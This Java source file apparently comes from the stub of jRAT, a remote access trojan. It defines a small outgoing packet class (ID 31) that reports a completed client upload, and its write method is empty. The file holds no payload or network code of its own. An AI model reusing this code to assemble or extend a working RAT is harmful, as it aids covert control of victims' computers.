package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;

import se.jrat.common.io.StringWriter;

public class Packet31CompleteClientUpload extends AbstractOutgoingPacket {
	
	private File file;
	
	public Packet31CompleteClientUpload(File file) {
		this.file = file;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		
	}

	@Override
	public byte getPacketId() {
		return (byte) 31;
	}

}
